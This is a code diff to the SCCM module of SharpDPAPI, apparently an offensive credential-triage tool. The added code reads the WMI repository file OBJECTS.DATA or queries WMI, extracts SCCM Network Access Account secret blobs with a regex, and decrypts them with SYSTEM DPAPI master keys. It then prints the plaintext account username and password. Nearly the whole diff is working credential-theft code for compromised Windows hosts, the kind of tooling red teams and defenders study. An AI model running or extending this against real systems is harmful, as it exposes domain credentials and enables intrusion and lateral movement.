@@ -3,12 +3,14 @@ using System.Text;
 using System.Collections.Generic;
 using System.Linq;
 using System.Management;
+using System.Text.RegularExpressions;
+using System.IO;
 
 namespace SharpDPAPI.Commands
 {
     public class SCCM : ICommand
     {
-        public static string CommandName => "SCCM";
+        public static string CommandName => "sccm";
 
         public static ManagementScope NewSccmConnection(string path)
         {
@@ -16,7 +18,8 @@ namespace SharpDPAPI.Commands
             ManagementScope sccmConnection = new ManagementScope(path, connection);
             try
             {
-                Console.WriteLine($"[+] Connecting to {sccmConnection.Path}");
+                Console.WriteLine($"[*] Retrieving SCCM Network Access Account blobs via WMI");
+                Console.WriteLine($"[*]     Connecting to {sccmConnection.Path}");
                 sccmConnection.Connect();
             }
             catch (System.UnauthorizedAccessException unauthorizedErr)
@@ -87,16 +90,14 @@ namespace SharpDPAPI.Commands
 
                 if (dryRun)
                 {
-                    Console.WriteLine($"[+] WQL query: {query}");
+                    Console.WriteLine($"[*]     WQL query: {query}");
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Executing WQL query: {query}");
+                    Console.WriteLine($"[*]     Executing WQL query: {query}");
                     ObjectQuery objQuery = new ObjectQuery(query);
                     ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
-                    Console.WriteLine("-----------------------------------");
-                    Console.WriteLine(wmiClass);
-                    Console.WriteLine("-----------------------------------");
+
                     foreach (ManagementObject queryObj in searcher.Get())
                     {
                         // Get lazy properties unless we're just counting instances
@@ -138,11 +139,10 @@ namespace SharpDPAPI.Commands
                                 }
                                 else
                                 {
-                                    Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
+                                    //Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
                                 }
                             }
                         }
-                        Console.WriteLine("-----------------------------------");
                     }
                 }
             }
@@ -152,7 +152,7 @@ namespace SharpDPAPI.Commands
             }
         }
 
-        public static void NAADecrypt(string blob, Dictionary<string, string> masterkeys)
+        public static string NAADecrypt(string blob, Dictionary<string, string> masterkeys)
         {
             byte[] blobBytes = new byte[blob.Length / 2];
             for (int i = 0; i < blob.Length; i += 2)
@@ -181,27 +181,39 @@ namespace SharpDPAPI.Commands
                             byte[] decBytes = new byte[finalIndex + 1];
                             Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                             data = Encoding.Unicode.GetString(decBytes);
+                            return data;
                         }
                         else
                         {
                             data = Encoding.ASCII.GetString(decBytesRaw);
+                            return data;
                         }
+
                         Console.WriteLine("    dec(blob)        : {0}", data);
                     }
                     else
                     {
                         string hexData = BitConverter.ToString(decBytesRaw).Replace("-", " ");
                         Console.WriteLine("    dec(blob)        : {0}", hexData);
+                        return hexData;
                     }
                 }
+                else
+                {
+                    return null;
+                }
+            }
+            else
+            {
+                return null;
             }
         }
 
-        public static void LocalNetworkAccessAccountsWmi()
+        public static void LocalNetworkAccessAccountsWmi(Dictionary<string,string> mappings)
         {
             if (!Helpers.IsHighIntegrity())
             {
-                Console.WriteLine("[X] Must be elevated to triage SYSTEM DPAPI Credentials!");
+                Console.WriteLine("[X] Must be elevated to retrieve NAA blobs via WMI!");
             }
             else
             {
@@ -221,19 +233,21 @@ namespace SharpDPAPI.Commands
                             int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                             Array.Resize(ref protectedUsernameBytes, length);
 
-                            Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();
+                            //Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();
 
-                            Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                            foreach (KeyValuePair<string, string> kvp in mappings)
-                            {
-                                Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
-                            }
-                            Console.WriteLine();
+
 
                             try
                             {
-                                NAADecrypt(protectedUsername, mappings);
-                                NAADecrypt(protectedPassword, mappings);
+                                string username = "";
+                                string password = "";
+
+                                Console.WriteLine("\r\n[*] Triaging SCCM Network Access Account Credentials\r\n");
+                                username = NAADecrypt(protectedUsername, mappings);
+                                password = NAADecrypt(protectedPassword, mappings);
+
+                                Console.WriteLine("    Plaintext NAA Username        : {0}", username);
+                                Console.WriteLine("    Plaintext NAA Password        : {0}", password);
                             }
                             catch (Exception e)
                             {
@@ -251,12 +265,99 @@ namespace SharpDPAPI.Commands
 
         }
 
+        public static void ParseFile(string pathToFile, Dictionary<string, string> masterkeys)
+        {
+            string fileData = "";
+            MemoryStream ms = new MemoryStream();
+
+            if (String.IsNullOrEmpty(pathToFile))
+            {
+                string path = @"C:\Windows\System32\wbem\Repository\OBJECTS.DATA";
+
+                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                using (var sr = new StreamReader(fs, Encoding.Default))
+                {
+                    fileData = sr.ReadToEnd();
+                }
+            }
+            else
+            {
+                Console.WriteLine($"\r\n[*] Path to OBJECTS.DATA file: {pathToFile}\n");
+
+                fileData = File.ReadAllText(pathToFile);
+            }
+
+            Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
+            var matchesData = regexData.Matches(fileData);
+
+            if (matchesData.Count <= 0)
+            {
+                Console.WriteLine("\r\n[x] No \"NetworkAccessAccount\" match found!");
+            }
+
+            for (int index = 0; index < matchesData.Count; index++)
+            {
+                for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
+                {
+                    try
+                    {
+                        string naaPlaintext = "";
+
+                        Console.WriteLine("\r\n[*] Triaging SCCM Network Access Account Credentials\r\n");
+                        naaPlaintext = NAADecrypt(matchesData[index].Groups[idxGroup].Value, masterkeys);
+                        Console.WriteLine("    Plaintext NAA    : {0}", naaPlaintext);
+                        Console.WriteLine();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                        Console.WriteLine(e.ToString());
+                    }
+
+                }
+            }
+        }
+
         public void Execute(Dictionary<string, string> arguments)
         {
             Console.WriteLine("\r\n[*] Action: SCCM Triage");
             arguments.Remove("SCCM");
 
-            LocalNetworkAccessAccountsWmi();
+            Dictionary<string, string> masterkeys = new Dictionary<string, string>();
+
+            if (arguments.ContainsKey("/mkfile"))
+            {
+                Console.WriteLine("\r\n[*] Using a give masterkeys file");
+                masterkeys = SharpDPAPI.Helpers.ParseMasterKeyFile(arguments["/mkfile"]);
+            }
+            else
+            {
+                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                masterkeys = Triage.TriageSystemMasterKeys();
+            }
+
+            foreach (KeyValuePair<string, string> kvp in masterkeys)
+            {
+                Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+            }
+
+            Console.WriteLine();
+
+            if (arguments.ContainsKey("/useobjectfile"))
+            {
+                string pathToFile = "";
+
+                if (arguments.ContainsKey("/pathToFile"))
+                {
+                    pathToFile = arguments["/pathToFile"];
+                }
+
+                ParseFile(pathToFile, masterkeys);
+            }
+            else
+            {
+                LocalNetworkAccessAccountsWmi(masterkeys);
+            }
         }
     }
 }
